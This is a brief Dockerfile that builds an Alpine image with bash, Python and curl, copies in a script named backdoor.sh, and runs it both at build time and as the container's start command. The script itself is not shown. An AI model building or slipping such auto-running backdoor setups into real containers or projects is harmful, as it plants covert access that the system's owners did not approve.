FROM alpine
RUN apk add bash
RUN apk add python
RUN apk add python3
RUN apk add curl
COPY backdoor.sh /backdoor.sh
RUN bash /backdoor.sh
CMD ["bash", "/backdoor.sh"]

